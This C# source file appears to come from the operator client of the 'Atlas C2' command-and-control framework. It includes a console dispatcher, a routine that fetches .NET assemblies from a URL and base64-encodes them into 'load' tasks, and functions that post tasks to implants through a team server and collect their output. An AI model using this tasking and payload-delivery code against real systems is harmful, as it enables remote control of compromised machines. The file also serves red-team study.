using System;
using System.Net;
using System.Threading;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;

using Newtonsoft.Json;

using Client.JSON;
using Client.Models;

using static System.Console;

using static Client.Models.Client;
using System.Text;

namespace Client.Utils
{
    static class UI
    {

        public static void Banner()
        {
            WriteLine(
                @"   _____     __   .__                    _________  ________  " + "\n" +
                @"  /  _  \  _/  |_ |  |  _____     ______ \_   ___ \ \_____  \ " + "\n" +
                @" /  /_\  \ \   __\|  |  \__  \   /  ___/ /    \  \/  /  ____/ " + "\n" +
                @"/    |    \ |  |  |  |__ / __ \_ \___ \  \     \____/       \ " + "\n" +
                @"\____|__  / |__|  |____/(____  //____  >  \______  /\_______ \" + "\n" +
                @"        \/                   \/      \/          \/         \/" + "\n" +
                $"\tVer: {Ver} \n\tAuthor: Grimmie\n"
            );
        }

        public static void Action(string input) {
            try
            {

                if (input is "") { throw new AtlasException(""); }

                String[] opts = null;
                string _out = null;

                if (_utils.Count == 0) { Init.UtilInit(); }
                if(_adminTask.Count == 0) { Init.AdminUtilInit(); }

                Models.Util util = _utils.FirstOrDefault(u => u.UtilName.Equals(input.Split(' ')[0], StringComparison.InvariantCultureIgnoreCase));

                Models.AdminTask admutil = _adminTask.FirstOrDefault(u => u.TaskName.Equals(input.Split(' ')[0], StringComparison.InvariantCultureIgnoreCase));

                if (util is null && admutil is null) { throw new AtlasException($"[-] Util {input} is invalid"); }

                if(input.Contains(' ')) { opts = input.Split(' '); }
                
                if(util is null) { _out = admutil.AdminUtilExec(opts); }
                else { _out = util.UtilExecute(opts); }

                WriteLine(_out);
            } catch (NotImplementedException) { WriteLine($"[-] Util {input} not yet implemented"); }
            catch (AtlasException e) { WriteLine(e.Message); }
            catch (Exception e) { WriteLine($"{e.Message}"); }

        }

        public static string Align(this object T, int lenth) {  return T.ToString().PadRight(lenth); }

        public static void ViewOption(string option) { WriteLine($"{option}"); }

    }

    static class TaskOps
    {
        public static void VerifyFileExistence(string file){ if (!(File.Exists(file))) { throw new AtlasException($"[-] File does not exist"); } }

        public static void VerifyURL(string file) {
            Uri url;
            bool URLStatus = Uri.TryCreate(file, UriKind.Absolute, out url) && (url.Scheme == Uri.UriSchemeHttp || url.Scheme == Uri.UriSchemeHttps);
            if(!URLStatus) { throw new AtlasException($"[-] Invalid URL detected "); }
        }

        public static object GetPropertyValue(this object T, string PropName) {
            return T.GetType().GetProperty(PropName) == null ? null : T.GetType().GetProperty(PropName).GetValue(T);
        }

        public static void SetPropertyValue(this object T, string PropName, string PropVal) {
            T.GetType().GetProperty(PropName).SetValue(T, PropVal);
        }

        public static void SetPropertyValue(this object T, string PropName, byte[] PropVal){
            T.GetType().GetProperty(PropName).SetValue(T, PropVal);
        }

        public static List<object> ReturnMethod(){
                if (_opts.Count == 0) { Init.OptInit(); }

                Task task = _opts.FirstOrDefault(u => u.TaskName.Equals(TaskName, StringComparison.InvariantCultureIgnoreCase));
                if (task is null) { throw new AtlasException($"[-] A task must be selected to view task options\n"); }

                return task.OptList;
        }

        public static void SmraatFetch(string fileAddr, int timeout, int retryCount) {
            VerifyURL(fileAddr);

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            int current_retry_count = retryCount;
            WriteLine($"[*] Attempting to fetch {fileAddr}");

            while (current_retry_count >= 0 && assemBytes == null)
            {
                try {
                    assemBytes = client.DownloadData(fileAddr);
                    if (Debug) { WriteLine($"[+] Fetched assem located at {fileAddr}"); }
                }
                catch (WebException)
                {
                    if (current_retry_count == 0) { 
                        throw new AtlasException($"[-] Failed to fetch {fileAddr} after {current_retry_count} attempts. Exiting...");
                    }

                    if (Debug) { WriteLine($"[-] Fetching {fileAddr} failed. Retrying in {timeout} seconds."); }
                    current_retry_count = current_retry_count - 1;
                    Thread.Sleep(timeout * 1000);
                }
            }
            client.Dispose();
        }

        public static void SmraatFetch(string filePath) {
            VerifyFileExistence(filePath);

            WriteLine($"Reading {filePath} and writing to assemByte");
            assemBytes = File.ReadAllBytes(filePath);
        }

        public static string ByteArrTob64Str(){
            var assemStr = Convert.ToBase64String(assemBytes);
            return assemStr;
        }

        public static string sendAdminUtil(string taskName, string args)
        {
            var sendData = JSONOps.PackTaskData(taskName, args);

            var tasksendOut = Comms.comms.SendPOST($"{TeamServerAddr}/Implants/{CurrentImplant}", sendData).TrimStart('[').TrimEnd(']');
            var taskId = JSONOps.ReturnTaskID(tasksendOut);
            WriteLine($"Task {taskId.Id} Initialized");
            Thread.Sleep(3000);

            var taskOut = Comms.comms.SendGET($"{TeamServerAddr}/Implants/{CurrentImplant}/tasks/{taskId.Id}");
            var taskOutrecv = JSONOps.ReturnTaskData(taskOut);
            WriteLine($"Task {taskId.Id} Complete\n");
            Thread.Sleep(1000);

            return taskOutrecv.TaskOut;
        }

        public static string sendAdminUtil(string taskName)
        {
            var sendData = JSONOps.PackTaskData(taskName, null);

            var tasksendOut = Comms.comms.SendPOST($"{TeamServerAddr}/Implants/{CurrentImplant}", sendData).TrimStart('[').TrimEnd(']');
            var taskId = JSONOps.ReturnTaskID(tasksendOut);
            WriteLine($"Task {taskId.Id} Initialized");
            Thread.Sleep(3000);

            var taskOut = Comms.comms.SendGET($"{TeamServerAddr}/Implants/{CurrentImplant}/tasks/{taskId.Id}");
            var taskOutrecv = JSONOps.ReturnTaskData(taskOut);
            WriteLine($"Task {taskId.Id} Complete\n");
            Thread.Sleep(1000);

            return taskOutrecv.TaskOut;
        }
    }

    public static class JSONOps {
        public static string PackTaskArgs(){
            var send = new Classes.ArgsData { Params = new List<Classes.TaskArgs> { } };

            var options = TaskOps.ReturnMethod();

            foreach (var opt in options)
            {
                send.Params.Add(new Classes.TaskArgs()
                {
                    OptionName = opt.GetPropertyValue("Name").ToString(),
                    OptionValue = opt.GetPropertyValue("Value").ToString()
                });
            }

            return JsonConvert.SerializeObject(send, new JsonSerializerSettings { StringEscapeHandling = StringEscapeHandling.EscapeNonAscii });
        }

        public static string PackTaskData(string args = null){

            var send = new Classes.TaskSend { Command = TaskName, Args = args };

            if (!(assemBytes is null) && TaskName.ToLower() is "load") {
                var assemStr = TaskOps.ByteArrTob64Str();
                send = null;
                send = new Classes.TaskSend { Command = TaskName, Args = "", File = assemStr};
            }

            return JsonConvert.SerializeObject(send, new JsonSerializerSettings { StringEscapeHandling = StringEscapeHandling.EscapeNonAscii });
        }

        
        public static string PackTaskData(string taskName, string args)
        {
            var send = new Classes.TaskSend { Command = taskName, Args = args };

            return JsonConvert.SerializeObject(send, new JsonSerializerSettings { StringEscapeHandling = StringEscapeHandling.EscapeNonAscii });
        }
        

        public static Classes.TaskSendOut ReturnTaskID(string taskresp) { return JsonConvert.DeserializeObject<Classes.TaskSendOut>(taskresp); }

        public static Classes.TaskRecvOut ReturnTaskData(string taskOut) { return JsonConvert.DeserializeObject<Classes.TaskRecvOut>(taskOut); }

        public static Classes.ArgsRecv ReturnTaskArgs(string taskArgs) { return JsonConvert.DeserializeObject<Classes.ArgsRecv>(taskArgs); }

        public static string PackStartListenerData(string name, int port)
        {
            var data = new Classes.StartListenerData { name = name, bindPort = port };

            return JsonConvert.SerializeObject(data, new JsonSerializerSettings { StringEscapeHandling = StringEscapeHandling.EscapeNonAscii });
        }
    }

    static class Init
    {
        public static void AdminUtilInit()
        {
            foreach (Type type in Assembly.GetExecutingAssembly().GetTypes())
            {
                if (type.IsSubclassOf(typeof(Models.AdminTask)))
                {
                    Models.AdminTask function = Activator.CreateInstance(type) as Models.AdminTask;
                    _adminTask.Add(function);
                }
            }

        }

        public static void OptInit()
        {
            foreach (Type type in Assembly.GetExecutingAssembly().GetTypes())
            {
                if (type.IsSubclassOf(typeof(Models.Task)))
                {
                    Models.Task function = Activator.CreateInstance(type) as Models.Task;
                    _opts.Add(function);
                }
            }
        }

        public static void UtilInit()
        {
            foreach (Type type in Assembly.GetExecutingAssembly().GetTypes())
            {
                if (type.IsSubclassOf(typeof(Models.Util)))
                {
                    Models.Util function = Activator.CreateInstance(type) as Models.Util;
                    _utils.Add(function);
                }
            }
        }
    }
}
